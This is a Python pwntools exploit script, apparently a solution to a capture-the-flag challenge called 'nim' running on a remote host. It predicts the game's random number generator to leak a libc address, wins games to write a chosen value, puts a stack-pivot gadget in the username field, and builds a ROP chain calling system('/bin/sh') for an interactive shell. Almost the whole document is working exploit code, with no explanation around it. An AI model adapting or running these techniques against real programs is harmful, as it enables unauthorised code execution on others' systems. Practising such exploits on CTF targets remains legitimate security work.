#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "nim.hackable.software"
PORT = 1337
PROCESS = "./nim"

const1 = 0x7CC216571FEE6FB
const2 = 0xFFFFFFFFFFFFFA3
const3 = 0x7FFFFFFF

seed = 0x7fab61836e90

def reverse(x, y, z):
	return x*y % z

def drand():
	global seed
	v1 = seed
	seed = reverse(seed, const1, const2)
	return v1&const3

def brute(state, next_state):
	global seed, brute_state
	i = 0xf000
	while 1:
		brute_state = i<<31|state
		seed = brute_state
		drand()
		if seed&const3 == next_state:
			return brute_state
		i += 0x1

def findLoser(A):
	n = len(A)
	res = 0
	for i in range(n):
		res ^= A[i]

	# case when Alice is winner
	if (res == 0 or n % 2 == 0):
		return "Me"
	# when Bob is winner
	else:
		return "Computer"

def nim_next(heaps):
	nim = 0

	# Calculate nim sum for all elements in the objectList
	for i in heaps:
		nim = nim ^ i
	if nim:
		for i in range(len(heaps)):
			vv = nim^heaps[i];
			if(vv<heaps[i]):
				return i, (heaps[i]-vv)
	else:
		for i in range(len(heaps)):
			if heaps[i] != 0:
				return i, heaps[i]

def win(value):
	global predict, heap_state
	num_heaps = 9
	play(value, num_heaps)

	predict = [drand() for i in range(int(num_heaps/2))]
	predict[-1] = predict[-1]^3
	predict.append(3)

	for i in range(len(predict)):
		r.sendlineafter(": ", str(predict[i]))

	last = 0
	while last == 0:
		r.recvuntil("heaps is: ")
		heap_state = eval(str(r.recvuntil("]")))
		
		if heap_state.count(0) == num_heaps-1:
			last = 1
		
		idx, val = nim_next(heap_state)

		r.sendlineafter(": ", str(idx+1))
		r.sendlineafter(": ", str(val))

def play(bet, num_heaps):
	r.sendlineafter("? ", str(bet))
	r.sendlineafter("? ", str(num_heaps))

def exploit(r):
	global seed

	log.info("Start playing game")
	r.sendlineafter("Choice:", "P")

	# send username
	r.sendlineafter("? ", "A"*31)

	num_heaps = 8
	play(100, num_heaps)
	r.recvuntil("Dealer has decided the sizes of heaps 1 - 4, now specify yours")

	for i in range(int(num_heaps/2 + 0.5)):
		r.sendlineafter(": ", str(i+1))

	r.recvuntil("taken ")
	stones_taken = int(str(r.recvuntil(" ")))
	r.recvuntil("from heap ")
	
	taken_idx = int(str(r.recvuntil(".", drop=True))) -1

	r.recvuntil("heaps is: ")
	heap_state = eval(str(r.recvuntil("]")))

	heap_state[taken_idx] += stones_taken

	rand_addr = brute(heap_state[0], heap_state[1])
	seed = rand_addr
	libc.address = rand_addr - libc.symbols["rand"]
	
	log.info("LIBC leak : %s" % hex(rand_addr))	
	log.info("LIBC      : %s" % hex(libc.address))

	r.sendlineafter(": ", "0")

	for i in range(4):
		drand()

	log.info("Put stack pivot gadget into username")

	# 0x000000000011163c: add rsp, 0x68; ret; 
	ADDRSP68 = libc.address + 0x11163c

	r.sendlineafter("[y/n]", "n")		# quit game
	r.sendlineafter(": ", "p")			# start new game
	
	payload = "A"*16
	payload += p64(ADDRSP68)

	r.sendlineafter("? ", payload)

	log.info("Win games until score matches target")

	# 0x0000000000089d27: add rsp, 0x2c0; pop rbp; pop r12; pop r13; ret;
	ADDRSP2D8 = libc.address + 0x89d27

	score = 10000	
	target = (ADDRSP2D8) & 0xffffffff

	log.info("Target: %s" % hex(target))

	while(score < target - score):
		log.info("Score: %s" % hex(score))			
		win(score)		
		score += score
		r.sendlineafter("? ", "y")		
	
	log.info("Win last game for exact score")	
	win(target-score+10)		# 10 will be used up in last game

	log.info("Put ropchain on stack")	
	r.sendlineafter("? ", "y")
	num_heaps = 44
	play(10, num_heaps)
	
	POPRDI = libc.address + 0x26b72
	ABSGOT = libc.address + 0x1eb0a8

	payload = p64(libc.address + 0x1e0000)
	payload += p64(POPRDI)		
	payload += p64(next(libc.search(b"/bin/sh")))
	payload += p64(libc.symbols["system"])
	payload += p64(ABSGOT) * 10
	
	for i in range(int(abs(num_heaps/4))):
		sys.stdout.write(".")
		target = u64(payload[i*8:(i+1)*8])

		p1 = (target) & 0xffffffff
		p2 = (target) >> 32		

		r.sendlineafter(": ", str(p1))
		r.sendlineafter(": ", str(p2))

	# resign and quit to trigger stack_chk_fail
	r.sendlineafter(": ", "0")
	r.sendlineafter("? ", "n")

	r.interactive()
	
	return

if __name__ == "__main__":
	# e = ELF("./nim")
	libc = ELF("./libc.so")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./nim")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)